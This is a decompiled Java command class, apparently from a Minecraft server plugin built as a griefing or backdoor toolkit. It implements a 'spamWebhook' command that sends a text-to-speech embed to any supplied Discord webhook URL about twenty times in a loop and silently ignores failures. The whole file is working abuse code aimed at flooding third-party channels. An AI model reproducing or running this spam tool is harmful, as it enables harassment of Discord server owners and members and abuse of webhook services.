/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import com.github.gist.DiscordWebhook;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.awt.Color;
import java.io.IOException;
import org.bukkit.entity.Player;

public class SpamwebhookCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 2) {
            p2.sendMessage(Settings.USAGE("spamWebhook <url> <message>"));
        } else {
            StringBuilder spam = new StringBuilder();
            for (int i2 = 2; i2 != args.length; ++i2) {
                spam.append(args[i2]).append(" ");
            }
            for (int x2 = 0; x2 <= 20; ++x2) {
                DiscordWebhook webhook = new DiscordWebhook(args[1]);
                webhook.setTts(true);
                webhook.addEmbed(new DiscordWebhook.EmbedObject().setTitle(":laughing: :slight_smile: :mask: :heart_eyes:").setColor(Color.orange).setDescription(spam.toString()));
                try {
                    webhook.execute();
                    continue;
                }
                catch (IOException iOException) {
                    // empty catch block
                }
            }
            p2.sendMessage(Settings.PREFIX("Spammed the message 20 times!"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

